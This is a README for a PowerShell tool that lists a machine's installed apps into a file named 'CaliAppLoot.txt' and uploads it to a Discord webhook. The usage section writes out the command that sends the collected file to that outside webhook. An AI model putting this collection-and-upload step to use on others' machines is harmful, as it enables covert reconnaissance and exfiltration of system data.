![](https://img.shields.io/badge/-PowerShell-blue)


Description

This PowerShell script provides two functions: Get-AppInfo and Upload-Discord. The Get-AppInfo function retrieves information about the installed applications on the local machine and saves the results to a temporary file. The Upload-Discord function allows you to upload the generated file or send a custom message to a Discord channel through a webhook.
Prerequisites

Before using this script, ensure you have the following:

    PowerShell: The script requires PowerShell to be installed on your system. It is included by default in Windows systems.

    Discord Webhook: You need a Discord webhook URL to use the Upload-Discord function. You can create a webhook in your Discord server by following these steps:
        Go to your Discord server settings.
        Click on "Integrations" on the left sidebar.
        Under the "Webhooks" section, click "Create Webhook" and follow the instructions to set it up. Copy the webhook URL provided.



Usage

    Collect App Information: The Get-AppInfo function will be used to collect information about the installed applications on your local machine. It will generate a file called "CaliAppLoot.txt" in the system's temporary directory. This file will contain details about the installed Appx packages.

Get-AppInfo


The generated file will be saved in the temporary directory of your system, and its path will be displayed after execution.

Upload to Discord: The Upload-Discord function allows you to upload the generated file or send a custom message to a Discord channel using the webhook URL.

# Upload file to Discord
Upload-Discord -webhookUrl 'YOUR WEBHOOK HERE' -file "$env:TEMP\CaliAppLoot.txt"

    Replace 'YOUR WEBHOOK HERE' with the actual webhook URL you obtained from Discord.

Important Notes

    Make sure to provide a valid webhook URL when using the Upload-Discord function; otherwise, it will not work correctly.

    The Upload-Discord function can handle either a file or a text message. You can choose to use either option based on your needs.

    Please use this script responsibly and ensure that you have the necessary permissions to collect and share application information.

    The script was designed to work on Windows systems, where PowerShell is available by default. It may not be compatible with other operating systems.
